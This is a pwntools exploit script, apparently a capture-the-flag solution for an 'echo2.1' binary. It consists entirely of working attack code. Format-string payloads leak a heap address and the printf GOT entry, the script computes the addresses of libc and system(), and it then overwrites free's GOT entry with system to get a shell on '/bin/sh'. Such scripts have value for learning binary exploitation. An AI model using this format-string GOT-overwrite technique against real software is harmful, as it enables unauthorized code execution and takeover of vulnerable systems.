from pwn import *
from pprint import pprint
elf = ELF("./echo2.1_remotelibc",checksec=False)
libco = ELF("./libs/libc.so.6",checksec=False)
data_add = 0x602098
printfoffset = 0x0000000000055810
payload1 = "AAAA"  + "%7$s" + p64(data_add)
payload2 = "AAAA"  + "%7$s" + p64(elf.got['printf'])



p = elf.process()
#gdb.attach(p)
p.sendline("/bin/sh")
p.sendline("2")
sleep(1)
p.recv()
p.sendline(payload1)

heap =  enhex(p.recvuntil("g"))
#print heap
heap = heap[8:len(heap)-8]
p.recv()

heap = "0x"+ ''.join([heap[i:i+2] for i in range(0, len(heap), 2)][::-1])
print  heap
p.sendline("2")
sleep(1)

p.recv()
p.sendline(payload2)
printf  = enhex(p.recvuntil("g"))
#print printf
p.recv()
printf  = printf[8:len(printf)-8]
printf = "0x" + ''.join([printf[i:i+2] for i in range(0, len(printf), 2)][::-1])
print  printf

libc  = int(printf,16) - libco.symbols["printf"]
system =  libc  +  libco.symbols["system"]
greeting  =  int(heap,16) + 0x18

print "libc:", hex(libc), "system" ,hex(system) , "greeting" , hex(greeting)

p.sendline("2")


system1 = int(hex(system)[:8],16)
system2 = int("0x"  + hex(system)[8:],16)
print system1 ,system2
padding1 =  "A" * (10 - len(str(system1))) 
padding2 =   "A" * (10 - len(str(system2)))
#changing the free got table address since when it's called it takes `o` which is a char pointer
payload1 = padding1 + "%{}x".format(system1-len(padding1)) + "%8$n" + p64(elf.got['free']+3) # gonna use only 24 bytes 8 for address 6 for the fsb and 10 for the padding 
payload2 = padding2 + "%{}x".format(system2-len(padding2)) + "%8$n" + p64(elf.got['free'] )
print payload1
p.sendline(payload2)
#gdb.attach(p)
p.sendline("2")
p.sendline(payload1)
print p.recv()
#p.sendline("4")
print p.recv()
#p.sendline("y")
gdb.attach(p)
p.interactive()







